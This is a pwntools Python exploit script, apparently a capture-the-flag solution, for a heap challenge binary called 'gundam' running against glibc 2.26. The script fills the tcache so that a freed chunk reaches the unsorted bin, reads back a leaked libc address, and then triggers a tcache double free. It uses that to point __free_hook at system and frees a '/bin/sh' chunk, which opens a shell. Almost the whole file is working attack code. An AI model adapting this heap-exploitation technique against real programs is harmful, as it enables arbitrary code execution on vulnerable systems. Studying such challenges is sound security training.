from pwn import *
#fastbin_dup_consolidate
context.log_level='debug'

def build(name,type):
	s.recvuntil('Your choice :')
	s.sendline('1')
	s.recvuntil('The name of gundam :')
	s.send(name)
	s.recvuntil('The type of the gundam :')
	s.sendline(str(type))

def visit(until=False):
        s.recvuntil('Your choice :')
        s.sendline('2')

	if until is not False:
		s.recvuntil(until)
		
def destroy(index):
        s.recvuntil('Your choice :')
        s.sendline('3')
	s.recvuntil('Which gundam do you want to Destory:')
	s.sendline(str(index))

def blow_up_factory():
        s.recvuntil('Your choice :')
        s.sendline('4')

if __name__ == "__main__":
	
	binary='./gundam'

	s=process(binary)

	e=ELF(binary)
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
	#Chunk 9.
	build('A',0) 
	build('B',0)
	build('C',0)
	build('D',0)
	build('F',0)
	build('G',0)
	build('H',0)
	build('I',0)
	build('J',0)

	for i in range(0,7):
		destroy(i) #libc-2.26 has 7 tcache,  tcache 7 all freed -> The rest are handled as heaps normally

	destroy(7) #unsorted bins create!!

	blow_up_factory()

	for i in range(0,8):
		build(chr(0x41+i)*8,0)

	
	visit(until='H'*8)
	libc_leak=u64(s.recv(6).ljust(8,'\x00'))
	libc_base=libc_leak-0x3dac78

	__free_hook=libc_base+libc.symbols['__free_hook']
	system=libc_base+libc.symbols['system']
	
	destroy(3)
	destroy(2)
	destroy(1) 
	destroy(1) #regardless of size double free

	blow_up_factory()

	build(p64(__free_hook),0)
	build('/bin/sh\00',0)
	build(p64(system),0)

	destroy(2)
	s.interactive()
